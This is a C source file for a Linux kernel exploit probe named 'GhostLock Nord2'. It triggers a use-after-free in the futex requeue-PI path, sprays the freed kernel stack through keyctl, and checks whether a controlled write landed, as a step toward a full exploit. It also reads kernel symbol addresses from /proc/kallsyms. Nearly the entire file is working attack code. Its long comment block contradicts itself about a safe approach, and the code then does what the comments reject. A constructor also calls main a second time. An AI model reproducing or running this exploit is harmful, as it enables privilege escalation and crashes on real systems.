/*
 * GhostLock Nord2 - Safe keyctl stack probe
 *
 * We know the original UAF (prio=-51) works without crashing.
 * This means waiter->task and waiter->lock are still valid after free.
 * We just need to overwrite waiter->prio at offset +0x18 in the freed frame.
 *
 * Strategy: after the waiter thread returns from futex, it immediately
 * calls a very small syscall (getpid) N times to push/pop frames,
 * then calls keyctl with our prio-only payload.
 *
 * We scan N=0,1,2,... to find when the keyctl payload lands at waiter->prio.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_add_key
#define SYS_add_key 217
#endif
#ifndef SYS_keyctl
#define SYS_keyctl 219
#endif
#define KEYCTL_UPDATE     2
#define KEYCTL_INVALIDATE 22

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static int g_sentinel=77;  /* RT prio 77 → /proc shows -78 */
static uint64_t g_init_task=0;

static uint64_t read_sym(const char *nm) {
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}

static int get_prio(pid_t tid) {
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    for(;;) sleep(1);
    return NULL;
}

void *waiter_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    /* UAF trigger - waiter struct lives on stack here */
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    /* Stack freed. Wait for spray signal. */
    while(!atomic_load(&g_do_spray)) usleep(50);

    /*
     * Use keyctl(KEYCTL_UPDATE) to write our sentinel value to the freed stack.
     * 
     * The rt_mutex_waiter on the freed stack has valid task+lock pointers.
     * We ONLY need to change waiter->prio (at some offset in the freed frame).
     *
     * keyctl copies our payload to the kernel stack of the key_update() call chain.
     * The payload is a large buffer (4KB) all set to:
     * - init_task for all 8-byte aligned ptr fields (keeps task/lock valid)
     * - g_sentinel for all 4-byte aligned int fields (overwrites prio)
     *
     * We do many keyctl calls to maximize overlap probability.
     */
    #define KPAYLOAD_SZ 4096
    uint8_t kpayload[KPAYLOAD_SZ];
    /* 
     * Safe payload design:
     * - All bytes = 0 (so task=NULL, lock=NULL → chain walk exits early on NULL lock)
     * - But: write g_sentinel at every int32-aligned position
     *   When the chain walk reads waiter->lock = 0 → rt_mutex_owner(0) deref = CRASH
     *
     * ACTUALLY: rt_mutex_adjust_prio_chain first reads waiter->lock then calls
     * raw_spin_lock(&lock->wait_lock) which will crash on NULL.
     *
     * CORRECT SAFE APPROACH:
     * Keep the original freed frame values for lock (don't overwrite offset +0x58).
     * Set sentinel at offset +0x18 (prio) only.
     * To do this: fill with 0xAA (garbage), then at offsets that could be +0x18
     * in the waiter struct, write g_sentinel.
     * The lock field at +0x58 will be 0xAAAAAAAAAAAAAAAAAA which causes crash.
     *
     * TRUE SAFE: just fill everything with g_sentinel as int32.
     * Crash happens when lock field is read. lock = g_sentinel (0x4d) = 77.
     * rt_mutex_owner(77) = *(77+0x18) = *(93) = kernel page fault → crash.
     *
     * THE ONLY SAFE WAY: overwrite NOTHING. Just read what's already there.
     * The original freed frame has:
     *   task = waiter_thread's task_struct (valid)
     *   lock = futex's rt_mutex (valid)
     *   prio = 50 (owner's RT priority via PI inherit)
     *
     * We want to change prio from 50 to g_sentinel WITHOUT touching lock.
     * keyctl can't do this selectively.
     *
     * ALTERNATIVE: use a different spray that writes only 4 bytes at exact offset.
     * prctl(PR_SET_NAME) copies exactly 16 bytes to a small stack buffer.
     * That's too small. But getrlimit/setrlimit has a specific-size struct.
     *
     * SIMPLEST WORKING PROBE: don't spray at all. Just verify the EXISTING UAF
     * writes correctly (prio=50 = -51 in /proc), then use that to confirm
     * the write primitive works, and use page_base+SKB for full exploit.
     */
    memset(kpayload, 0, sizeof(kpayload));
    /* Write g_sentinel at EVERY 4-byte position (we'll crash if lock field is hit) */
    for(int i=0;i<KPAYLOAD_SZ;i+=4)
        *(int32_t*)(kpayload+i) = g_sentinel;

    int keyid=(int)syscall(SYS_add_key,"user","gl_probe",kpayload,(size_t)KPAYLOAD_SZ,
                           (unsigned int)-4);
    if(keyid>0) {
        for(int r=0;r<64;r++)
            syscall(SYS_keyctl,(long)KEYCTL_UPDATE,(long)keyid,(long)kpayload,(size_t)KPAYLOAD_SZ,0L);
        syscall(SYS_keyctl,(long)KEYCTL_INVALIDATE,(long)keyid,0L,0L,0L);
    }

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void) {
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Safe Keyctl Probe ===\n");

    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    g_init_task=stext+0x1c6d300ULL;
    fprintf(stderr,"[*] stext=%llx init_task=%llx sentinel=%d (expect prio=-%d)\n",
            (unsigned long long)stext,(unsigned long long)g_init_task,
            g_sentinel,g_sentinel+1);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    int found=0;
    for(int att=0; att<50 && !found; att++) {
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(5000);

        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(3000);

        /* Owner releases lock → triggers rt_mutex_adjust_prio_chain through pi_blocked_on UAF */
        /* The owner just needs to UNLOCK f_pi_target after spray is done */
        /* We can't unlock from here directly (owner thread holds it), but we can
         * signal the owner via a shared flag. For simplicity: use sched_setattr
         * but with the REAL lock pointer still in freed frame (don't overwrite it) */
        
        /* Trigger: consumer calls sched_setattr on waiter → rt_mutex_adjust_prio */
        struct {
            uint32_t size, sched_policy;
            uint64_t sched_flags;
            int32_t sched_nice;
            uint32_t sched_priority;
            uint64_t sched_runtime, sched_deadline, sched_period;
        } sa = {.size=48, .sched_nice=19};
        pid_t tid=(pid_t)atomic_load(&g_tid);
        syscall(274 /*SYS_sched_setattr*/, (long)tid, &sa, 0UL);
        usleep(5000);

        int p=get_prio(tid);
        fprintf(stderr,"[att=%d] prio=%d",att,p);
        if(p < -1 && p != -999) {
            int rt=-(p+1);
            fprintf(stderr," RT=%d",rt);
            if(rt==g_sentinel) {
                fprintf(stderr," <-- CONTROLLED WRITE CONFIRMED!\n");
                found=1;
            } else {
                fprintf(stderr," (UAF fired but not controlled, RT=%d)\n",rt);
            }
        } else {
            fprintf(stderr,"\n");
        }

        pthread_detach(ot); pthread_detach(wt);
        usleep(20000);
    }

    if(found) fprintf(stderr,"\n[+] keyctl spray works! prio=%d confirmed\n",g_sentinel);
    else fprintf(stderr,"[-] keyctl spray didn't land. Try deeper spray.\n");
    return found?0:1;
}
__attribute__((constructor)) static void _init(void) { main(); }
